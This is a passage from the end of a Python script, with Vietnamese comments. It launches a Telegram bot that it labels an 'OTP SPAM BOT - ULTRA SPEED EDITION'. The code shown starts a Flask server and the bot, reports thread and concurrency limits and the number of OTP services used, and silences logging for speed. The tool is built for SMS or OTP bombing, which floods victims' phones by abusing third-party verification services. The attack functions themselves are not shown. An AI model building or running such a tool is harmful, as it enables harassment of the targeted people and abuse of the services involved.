    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)

def run_telegram_bot():
    """Chạy Telegram bot"""
    print("=" * 60)
    print("🚀 OTP SPAM BOT - ULTRA SPEED EDITION")
    print("=" * 60)
    print(f"⚡ Max Threads: {MAX_THREADS}")
    print(f"🚀 Concurrent Requests: {MAX_CONCURRENT_REQUESTS}")
    print(f"📱 OTP Services: {len(FAST_OTP_FUNCTIONS)}")
    print(f"🔧 CPU Cores: {multiprocessing.cpu_count()}")
    print(f"💾 MongoDB: {DATABASE_NAME}")
    print("=" * 60)
    print("🤖 Starting Ultra Speed Bot...")
    
    # Khởi tạo request sessions
    init_request_sessions()
    
    # Khởi động bot
    bot.infinity_polling(timeout=60, long_polling_timeout=60)

if __name__ == '__main__':
    # Tắt logging để tăng tốc
    logging.getLogger('requests').setLevel(logging.WARNING)
    logging.getLogger('urllib3').setLevel(logging.WARNING)
    logging.getLogger('pymongo').setLevel(logging.WARNING)
    
    # Khởi chạy Flask trong thread riêng
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Khởi chạy Telegram bot
    try:
        run_telegram_bot()
    except KeyboardInterrupt:
        print("\n👋 Bot stopped")
    except Exception as e:
        print(f"❌ Bot error: {e}")
